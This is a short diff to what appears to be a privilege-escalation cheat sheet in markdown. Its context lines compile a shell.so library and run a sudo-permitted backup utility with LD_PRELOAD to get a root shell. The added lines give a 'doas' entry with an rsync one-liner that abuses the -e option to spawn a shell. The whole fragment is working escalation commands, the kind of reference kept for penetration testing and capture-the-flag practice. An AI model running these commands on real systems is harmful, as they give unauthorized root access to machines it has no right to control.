@@ -76,3 +76,7 @@ EOF
 gcc -fPIC -shared -o shell.so shell.c -nostartfiles
 sudo LD_PRELOAD=/tmp/shell.so /usr/bin/sky_backup_utility
 ```
+#### doas
+```
+doas rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
+```
